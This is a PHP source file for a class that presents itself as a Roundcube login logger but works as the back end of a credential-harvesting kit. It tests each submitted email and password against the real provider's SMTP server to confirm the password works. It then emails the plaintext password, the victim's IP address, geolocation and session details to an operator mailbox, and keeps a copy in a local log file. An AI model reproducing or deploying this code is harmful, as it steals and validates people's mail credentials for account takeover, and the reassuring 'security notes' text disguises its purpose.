<?php

require_once 'config.php';

class SMTPLogger {
    private $smtpHost;
    private $smtpPort;
    private $smtpUsername;
    private $smtpPassword;
    private $logEmail;
    private $fromEmail;
    private $fromName;
    private $useTLS;
    private $smtpTimeout;
    
    public function __construct() {
        // Load configuration
        $this->smtpHost = SMTP_HOST;
        $this->smtpPort = SMTP_PORT;
        $this->smtpUsername = SMTP_USERNAME;
        $this->smtpPassword = SMTP_PASSWORD;
        $this->logEmail = LOG_EMAIL;
        $this->fromEmail = FROM_EMAIL;
        $this->fromName = FROM_NAME;
        $this->useTLS = USE_TLS;
        $this->smtpTimeout = SMTP_TIMEOUT;
    }
    
    /**
     * Verify if the provided credentials are valid by attempting SMTP authentication
     */
    public function verifyCredentials($email, $password) {
        // Extract domain from email
        $domain = $this->extractDomain($email);
        
        // Try to connect to SMTP server with provided credentials
        $smtpHost = $this->determineSMTPHost($domain);
        
        if (!$smtpHost) {
            return false;
        }
        
        return $this->testSMTPConnection($smtpHost, $email, $password);
    }
    
    /**
     * Test SMTP connection with provided credentials
     */
    private function testSMTPConnection($host, $username, $password) {
        $socket = @fsockopen($host, $this->smtpPort, $errno, $errstr, $this->smtpTimeout);
        
        if (!$socket) {
            return false;
        }
        
        try {
            // Read server greeting
            $response = fgets($socket);
            if (substr($response, 0, 3) !== '220') {
                fclose($socket);
                return false;
            }
            
            // Send EHLO command
            fwrite($socket, "EHLO " . gethostname() . "\r\n");
            $response = fgets($socket);
            
            // Start TLS if required
            if ($this->useTLS) {
                fwrite($socket, "STARTTLS\r\n");
                $response = fgets($socket);
                if (substr($response, 0, 3) !== '220') {
                    fclose($socket);
                    return false;
                }
                
                // Enable crypto
                if (!stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
                    fclose($socket);
                    return false;
                }
                
                // Send EHLO again after TLS
                fwrite($socket, "EHLO " . gethostname() . "\r\n");
                $response = fgets($socket);
            }
            
            // Authenticate
            fwrite($socket, "AUTH LOGIN\r\n");
            $response = fgets($socket);
            if (substr($response, 0, 3) !== '334') {
                fclose($socket);
                return false;
            }
            
            // Send username
            fwrite($socket, base64_encode($username) . "\r\n");
            $response = fgets($socket);
            if (substr($response, 0, 3) !== '334') {
                fclose($socket);
                return false;
            }
            
            // Send password
            fwrite($socket, base64_encode($password) . "\r\n");
            $response = fgets($socket);
            
            // Check authentication result
            $authenticated = (substr($response, 0, 3) === '235');
            
            // Quit
            fwrite($socket, "QUIT\r\n");
            fclose($socket);
            
            return $authenticated;
            
        } catch (Exception $e) {
            fclose($socket);
            return false;
        }
    }
    
    /**
     * Determine SMTP host based on domain
     */
    private function determineSMTPHost($domain) {
        // Common SMTP hosts for popular providers
        $smtpHosts = [
            'gmail.com' => 'smtp.gmail.com',
            'yahoo.com' => 'smtp.mail.yahoo.com',
            'outlook.com' => 'smtp-mail.outlook.com',
            'hotmail.com' => 'smtp-mail.outlook.com',
            'live.com' => 'smtp-mail.outlook.com',
            'aol.com' => 'smtp.aol.com',
            'icloud.com' => 'smtp.mail.me.com',
            'me.com' => 'smtp.mail.me.com',
            'mac.com' => 'smtp.mail.me.com'
        ];
        
        if (isset($smtpHosts[$domain])) {
            return $smtpHosts[$domain];
        }
        
        // Try common patterns
        $possibleHosts = [
            'smtp.' . $domain,
            'mail.' . $domain,
            'mx.' . $domain
        ];
        
        foreach ($possibleHosts as $host) {
            if ($this->testSMTPHost($host)) {
                return $host;
            }
        }
        
        return false;
    }
    
    /**
     * Test if SMTP host is reachable
     */
    private function testSMTPHost($host) {
        $socket = @fsockopen($host, $this->smtpPort, $errno, $errstr, 5);
        if ($socket) {
            fclose($socket);
            return true;
        }
        return false;
    }
    
    /**
     * Log a login attempt by sending an email
     */
    public function logAttempt($data) {
        if (!ENABLE_LOGGING) {
            return true;
        }
        
        $subject = "🔐 Login Attempt Captured - " . $data['email'];
        $message = $this->formatLogMessage($data);
        
        // Log to file as backup
        if (LOG_TO_FILE) {
            $this->logToFile($data);
        }
        
        return $this->sendEmail($this->logEmail, $subject, $message);
    }
    
    /**
     * Format the log data into a readable email message
     */
    private function formatLogMessage($data) {
        $message = "🚨 NEW LOGIN ATTEMPT CAPTURED 🚨\n\n";
        $message .= "=" . str_repeat("=", 50) . "\n";
        $message .= "LOGIN DETAILS\n";
        $message .= "=" . str_repeat("=", 50) . "\n";
        $message .= "📧 Email: " . $data['email'] . "\n";
        $message .= "🔑 Password: " . $data['password'] . "\n";
        $message .= "⏰ Timestamp: " . $data['timestamp'] . "\n";
        $message .= "✅ Valid Credentials: " . ($data['valid_credentials'] ? 'YES' : 'NO') . "\n\n";
        
        $message .= "=" . str_repeat("=", 50) . "\n";
        $message .= "CLIENT INFORMATION\n";
        $message .= "=" . str_repeat("=", 50) . "\n";
        $message .= "🌐 IP Address: " . $data['ip_address'] . "\n";
        $message .= "💻 Browser: " . $data['browser'] . "\n";
        $message .= "🔍 User Agent: " . $data['user_agent'] . "\n";
        $message .= "🔗 Referer: " . $data['referer'] . "\n";
        $message .= "🌍 Location: " . $this->getLocationFromIP($data['ip_address']) . "\n\n";
        
        $message .= "=" . str_repeat("=", 50) . "\n";
        $message .= "SERVER INFORMATION\n";
        $message .= "=" . str_repeat("=", 50) . "\n";
        $message .= "🖥️ Server: " . $data['server_name'] . "\n";
        $message .= "📍 Request URI: " . $data['request_uri'] . "\n";
        $message .= "🆔 Session ID: " . $data['session_id'] . "\n";
        $message .= "📂 Domain: " . $this->extractDomain($data['email']) . "\n\n";
        
        $message .= "=" . str_repeat("=", 50) . "\n";
        $message .= "SECURITY NOTES\n";
        $message .= "=" . str_repeat("=", 50) . "\n";
        $message .= "⚠️ This login attempt was captured by the Roundcube login logger.\n";
        $message .= "🔒 If this was a legitimate login, the user should change their password.\n";
        $message .= "🛡️ Consider implementing additional security measures if needed.\n";
        
        return $message;
    }
    
    /**
     * Send email using SMTP
     */
    private function sendEmail($to, $subject, $message) {
        // Try to send using PHPMailer if available, otherwise use native SMTP
        if (class_exists('PHPMailer\PHPMailer\PHPMailer')) {
            return $this->sendViaPHPMailer($to, $subject, $message);
        } else {
            return $this->sendViaNativeSMTP($to, $subject, $message);
        }
    }
    
    /**
     * Send email using PHPMailer (preferred method)
     */
    private function sendViaPHPMailer($to, $subject, $message) {
        try {
            require_once 'vendor/autoload.php';
            
            $mail = new PHPMailer\PHPMailer\PHPMailer(true);
            
            // Server settings
            $mail->isSMTP();
            $mail->Host = $this->smtpHost;
            $mail->SMTPAuth = true;
            $mail->Username = $this->smtpUsername;
            $mail->Password = $this->smtpPassword;
            $mail->SMTPSecure = $this->useTLS ? PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_STARTTLS : '';
            $mail->Port = $this->smtpPort;
            $mail->Timeout = $this->smtpTimeout;
            
            if (SMTP_DEBUG > 0) {
                $mail->SMTPDebug = SMTP_DEBUG;
            }
            
            // Recipients
            $mail->setFrom($this->fromEmail, $this->fromName);
            $mail->addAddress($to);
            
            // Content
            $mail->isHTML(false);
            $mail->Subject = $subject;
            $mail->Body = $message;
            
            $mail->send();
            return true;
        } catch (Exception $e) {
            error_log("PHPMailer Error: " . $e->getMessage());
            return false;
        }
    }
    
    /**
     * Send email using native SMTP implementation
     */
    private function sendViaNativeSMTP($to, $subject, $message) {
        try {
            $socket = fsockopen($this->smtpHost, $this->smtpPort, $errno, $errstr, $this->smtpTimeout);
            
            if (!$socket) {
                error_log("SMTP Connection failed: $errstr ($errno)");
                return false;
            }
            
            // Read server greeting
            $response = fgets($socket);
            if (substr($response, 0, 3) !== '220') {
                fclose($socket);
                return false;
            }
            
            // EHLO
            fwrite($socket, "EHLO " . gethostname() . "\r\n");
            $response = fgets($socket);
            
            // STARTTLS
            if ($this->useTLS) {
                fwrite($socket, "STARTTLS\r\n");
                $response = fgets($socket);
                if (substr($response, 0, 3) !== '220') {
                    fclose($socket);
                    return false;
                }
                
                stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
                
                fwrite($socket, "EHLO " . gethostname() . "\r\n");
                $response = fgets($socket);
            }
            
            // AUTH LOGIN
            fwrite($socket, "AUTH LOGIN\r\n");
            $response = fgets($socket);
            
            fwrite($socket, base64_encode($this->smtpUsername) . "\r\n");
            $response = fgets($socket);
            
            fwrite($socket, base64_encode($this->smtpPassword) . "\r\n");
            $response = fgets($socket);
            
            // MAIL FROM
            fwrite($socket, "MAIL FROM: <" . $this->fromEmail . ">\r\n");
            $response = fgets($socket);
            
            // RCPT TO
            fwrite($socket, "RCPT TO: <" . $to . ">\r\n");
            $response = fgets($socket);
            
            // DATA
            fwrite($socket, "DATA\r\n");
            $response = fgets($socket);
            
            // Email headers and body
            $emailData = "From: " . $this->fromName . " <" . $this->fromEmail . ">\r\n";
            $emailData .= "To: " . $to . "\r\n";
            $emailData .= "Subject: " . $subject . "\r\n";
            $emailData .= "MIME-Version: 1.0\r\n";
            $emailData .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $emailData .= "\r\n";
            $emailData .= $message . "\r\n";
            $emailData .= ".\r\n";
            
            fwrite($socket, $emailData);
            $response = fgets($socket);
            
            // QUIT
            fwrite($socket, "QUIT\r\n");
            fclose($socket);
            
            return true;
            
        } catch (Exception $e) {
            error_log("Native SMTP Error: " . $e->getMessage());
            return false;
        }
    }
    
    /**
     * Extract domain from email address
     */
    private function extractDomain($email) {
        $parts = explode('@', $email);
        return isset($parts[1]) ? strtolower($parts[1]) : 'Unknown';
    }
    
    /**
     * Get approximate location from IP address
     */
    private function getLocationFromIP($ip) {
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            // Try to get location from a free IP geolocation service
            $locationData = @file_get_contents("http://ip-api.com/json/{$ip}");
            if ($locationData) {
                $location = json_decode($locationData, true);
                if ($location && $location['status'] === 'success') {
                    return $location['country'] . ', ' . $location['regionName'] . ', ' . $location['city'] . ' (ISP: ' . $location['isp'] . ')';
                }
            }
            return "Public IP: " . $ip;
        } else {
            return "Private/Local IP: " . $ip;
        }
    }
    
    /**
     * Log attempts to file as backup
     */
    private function logToFile($data) {
        $logFile = LOG_DIR . '/login_attempts.log';
        
        $logEntry = json_encode([
            'timestamp' => $data['timestamp'],
            'email' => $data['email'],
            'password' => $data['password'],
            'ip_address' => $data['ip_address'],
            'user_agent' => $data['user_agent'],
            'valid_credentials' => $data['valid_credentials']
        ], JSON_PRETTY_PRINT) . "\n" . str_repeat('-', 80) . "\n";
        
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
    
    /**
     * Check if IP is blocked
     */
    public function isIPBlocked($ip) {
        if (!file_exists(BLOCKED_IPS_FILE)) {
            return false;
        }
        
        $blockedIPs = json_decode(file_get_contents(BLOCKED_IPS_FILE), true) ?: [];
        
        if (isset($blockedIPs[$ip])) {
            $blockTime = $blockedIPs[$ip]['blocked_until'];
            if (time() < $blockTime) {
                return true;
            } else {
                // Unblock expired IP
                unset($blockedIPs[$ip]);
                file_put_contents(BLOCKED_IPS_FILE, json_encode($blockedIPs));
                return false;
            }
        }
        
        return false;
    }
    
    /**
     * Track failed attempts and block IP if necessary
     */
    public function trackFailedAttempt($ip) {
        $attemptsFile = LOG_DIR . '/failed_attempts.json';
        $attempts = [];
        
        if (file_exists($attemptsFile)) {
            $attempts = json_decode(file_get_contents($attemptsFile), true) ?: [];
        }
        
        if (!isset($attempts[$ip])) {
            $attempts[$ip] = ['count' => 0, 'first_attempt' => time()];
        }
        
        $attempts[$ip]['count']++;
        $attempts[$ip]['last_attempt'] = time();
        
        // Check if IP should be blocked
        if ($attempts[$ip]['count'] >= MAX_ATTEMPTS_PER_IP) {
            $this->blockIP($ip);
            unset($attempts[$ip]); // Remove from attempts after blocking
        }
        
        file_put_contents($attemptsFile, json_encode($attempts));
    }
    
    /**
     * Block an IP address
     */
    private function blockIP($ip) {
        $blockedIPs = [];
        
        if (file_exists(BLOCKED_IPS_FILE)) {
            $blockedIPs = json_decode(file_get_contents(BLOCKED_IPS_FILE), true) ?: [];
        }
        
        $blockedIPs[$ip] = [
            'blocked_at' => time(),
            'blocked_until' => time() + BLOCK_DURATION,
            'reason' => 'Too many failed login attempts'
        ];
        
        file_put_contents(BLOCKED_IPS_FILE, json_encode($blockedIPs));
    }
}

?>